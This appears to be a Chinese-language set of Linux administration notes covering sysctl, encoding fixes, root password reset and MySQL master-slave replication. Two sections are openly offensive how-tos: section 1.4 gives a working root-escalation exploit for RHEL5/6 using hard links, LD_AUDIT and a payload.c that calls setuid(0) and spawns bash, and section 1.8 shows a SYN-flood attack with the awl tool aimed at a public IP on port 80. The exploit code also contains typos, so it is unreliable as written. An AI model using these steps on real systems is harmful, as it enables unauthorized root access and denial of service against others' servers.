#### 1.1 sysctl
sysctl配置与显示在/proc/sys目录中的内核参数．可以用sysctl来设置或重新设置联网功能，如IP转发、IP碎片去除以及源路由检查等。用户只需要编辑/etc/sysctl.conf文件，即可手工或自动执行由sysctl控制的功能。  
sysctl是一个允许您改变正在运行中的Linux系统的接口。它包含一些TCP/IP堆栈和虚拟内存系统的高级选项， 这可以让有经验的管理员提高引人注目的系统性能。  
可以使用sysctl修改系统变量，也可以通过编辑sysctl.conf文件来修改系统变量
#### 1.2 Unix时间
我们通常把从UTC时区1970年1月1号开始的时间叫做Unix时间。

#### 1.3 web服务器运行方式

1. 服务器对客户端发来的请求(requeset)进行解析
2. 请求被转发到一个预定义的处理器(handler)
3. 处理器可能会从数据库中取出数据
4. 处理器根据取出的数据对模板(template)进行渲染(render)
5. 处理器向客户端返回渲染后的内容作为对请求的响应(response).

#### 1.4 提权

利用linux漏洞把普通用户提权到超级用户(支持REHEL5-REHEL6)
cd /tmp  
mkdir exploit  
ln /bin/ping  /tmp/exploit/target  
exec 3< /tmp/exploit/target  
ll /proc/$$/fd/3  
rm -rf /tmp/exploit/  
ll /proc/$$/fd/3  
cd /tmp/  
vi payload.c  
gcc -w -fPIC -shared  -o /tmp/exploit payload.c   
LD_AUDIT="\$ORGIN" exec /proc/self/fd/3  


payload.c代码如下  

    void __attribute__((construcotr))  init()
    {
            setuid(0);
            system("/bin/bash");
    }

    注：LD_AUDIT 时候会报错提示ORGIN不存在,这个没有关系。
#### 1.5 乱码
window下传文件到linux下 中文有时候会乱码
这时候要对传上去的文件进行转码  
    iconv -f gb2312 c.txt -o sss.txt  

    注：window下编码是gb2312

#### 1.5 linux文件下载到window下错行 
这是由于这2种操作系统处理回车不同  
linux安装下载unix2dos  
unix2dos a.txt

#### 1.6 忘记root密码如何处理
当我们忘记密码的时候，在电脑重启的界面
![image](https://raw.githubusercontent.com/yushixngheng/tutorial/master/photos/root_1.png)输入字母e进入到boot,然后在

![image](https://raw.githubusercontent.com/yushixngheng/tutorial/master/photos/root_2.png)中输入e进入到![image](https://raw.githubusercontent.com/yushixngheng/tutorial/master/photos/root_3.png)，进入到内核里面kernel![image](https://raw.githubusercontent.com/yushixngheng/tutorial/master/photos/root_4.png)然后在下面选中的那行![image](https://raw.githubusercontent.com/yushixngheng/tutorial/master/photos/root_5.png)输入空格 + 1(如下图所示) 进入到单用户模式![image](https://raw.githubusercontent.com/yushixngheng/tutorial/master/photos/root_6.png) 按回车返回上级目录
![image](https://raw.githubusercontent.com/yushixngheng/tutorial/master/photos/root_4.png)输入b重启，进入到单用户模式，重启后界面如下进入到单用户模式![image](https://raw.githubusercontent.com/yushixngheng/tutorial/master/photos/root_7.png)
这时候你就可以输入passwd 修改root密码了![image](https://raw.githubusercontent.com/yushixngheng/tutorial/master/photos/root_8.png)

#### 1.5 linux用户密码加密原理
123456+随机值->sha512->(随机值)Ftx5ONJU1OeOlL
#### 1.6 mysql主从复制
整体上来说，复制有3个步骤：

第一步：master记录二进制日志。在每个事务更新数据完成之前，master在二日志记录这些改变。MySQL将事务写入二进制日志，即使事务中的语句都是交叉执行的。在事件写入二进制日志完成后，master通知存储引擎提交事务。  
第二步：slave将master的binary log拷贝到它自己的中继日志。首先，slave开始一个工作线程——I/O线程。I/O线程在master上打开一个普通的连接，然后开始binlog dump process。Binlog dump process从master的二进制日志中读取事件，如果已经执行完master产生的所有文件，它会睡眠并等待master产生新的事件。I/O线程将这些事件写入中继日志。  
第三步：SQL slave thread（SQL线程）处理该过程的最后一步。SQ L线程从中继日志读取事件，并重新执行其中的事件而更新slave的数据，使其与master中的数据一致。

##### 1.6.1主服务器
配置mysql主要同步的数据库名字并开启对应的二进制日志  
#vim /etc/my.cnf   # my.cnf 是mysql 主配置文件
[mysqld]
datadir=/var/lib/mysql
socket=/var/lib/mysql/mysql.sock
user=mysql
symbolic-links=0    #在原配置文件中，添加以下内容：

log-bin=mysqllog  
server-id=1  
binlog-do-db=cd    
注释：
log-bin=mysqllog  #启用二进制日志，默认存在/var/lib/mysql  下面
server-id=1  #本机数据库ID唯一标示。  
binlog-do-db=cd #可以被从服务器复制的库。二进制需要同步的数据库名  
#binlog-ignore-db=mk2 #不可以被从服务器复制的库  
授权  
mysql> grant replication slave on *.* to slave@192.168.33.10 identified by "123456";  

在从服务器上测试登录：
[root@node1 ~]# mysql -h 192.168.13.10 -u slave -p123456

复制前保证主从两个数据库数据一致：  
把主的原始数据传给从：  
例：导出所有数据库：

[root@node1 ~]# mysqldump -u root -p  -A > all1.sql  

参数：-A, --all-databases Dump all the databases.  

数据库复制到node1上：
scp all1.sql 192.168.33.11:/root  

[root@xuegod64 ~]# mysql -u root -p < all1.sql   #导入数据库，和主服务器保持一致  
Enter password: 

##### 1.6.2 从服务器
修改从服务器配置文件：
[root@xuegod64 ~]# vim /etc/my.cnf 
[mysqld]
datadir=/var/lib/mysql
socket=/var/lib/mysql/mysql.sock
user=mysql
symbolic-links=0    
#在配置文件中写入以下内容
server-id=2  #从服务器ID号，不要和主ID相同，如果设置多个从服务器，每个从服务器必须有一个唯一的server-id值，必须与主服务器的以及其它从服务器的不相同。可以认为server-id值类似于IP地址：这些ID值能唯一识别复制服务器群集中的每个服务器实例。  
master-host=192.168.33.10    #指定主服务器IP地址
master-user=slave #指定在主服务器上可以进行同步的用户名  
master-password=123456   #密码  
####以下可以不写  
master-port = 3306   #同步所用的端口  

master-connect-retry=60
#断点重新连接时间  

保存，重启
##### 1.6.3 结果查看
测试：
主服务器上查看：  
mysql> show master status;  
从服务器上查看：  
mysql> show slave status \G  
当查看到             
Slave_IO_Running: Yes  
Slave_SQL_Running: Yes  
#可以看到这两个Yes，说明从服务器安装成功。
排错：  
同步之前如果怀疑主从数据不同步可以采取：上面冷备份远程拷贝法或者在从服务器上命行同步方法。

    注：192.168.33.10 主服务器
        192.1683.33.11 从服务器
#### 1.7 http中svn密码生成
用户名+密码 -》sha512 -》 密码
#### 1.8 awl攻击服务器
获取对方的IP地址解析成MAC地址   
[root@node0 ~]# ping 120.77.206.254  
[root@node0 ~]# arp -a  
? (192.168.33.1) at 0a:00:27:00:00:17 [ether] on eth1  
? (10.0.2.2) at 52:54:00:12:35:02 [ether] on eth0  

开始攻击：  
awl参数如下:  
-i 发送包的接口,如果省略默认是eth0  
-m 指定目标mac地址     
注：如果-m没有指定mac，默认目标MAC地址是“FF.FF.FF.FF.FF.FF”，FF.FF.FF.FF.FF.FFMAC地址是什么？  
这表示向同一网段内的所有主机发出ARP广播，进行SYN攻击，还容易使整个局域网瘫痪。  

-d 被攻击机器的IP  
-p 被攻击机器的端口  
[root@node0 ~]# awl -i eth0 -m 52:54:00:12:35:02 -d 120.77.206.254 -p 80   
然后在服务器上就能看见被攻击的情况  
[root@yjxtest ~]# netstat -antup | grep 80     

    注：服务器上必须有个web服务
        启动apache：
        service httpd start
